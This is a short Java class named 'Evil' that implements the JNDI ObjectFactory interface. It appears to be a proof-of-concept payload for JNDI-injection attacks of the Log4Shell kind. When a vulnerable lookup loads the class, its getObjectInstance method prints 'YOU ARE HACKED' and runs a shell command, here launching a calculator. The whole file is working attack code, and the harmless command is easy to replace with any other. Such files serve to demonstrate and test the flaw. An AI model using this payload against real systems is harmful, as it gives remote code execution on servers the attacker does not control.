import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Evil implements ObjectFactory {

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?,?> environment) {
        System.out.println("YOU ARE HACKED");
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (java.io.IOException e) {
            throw new RuntimeException(e);
        }
        return null;
    }

}
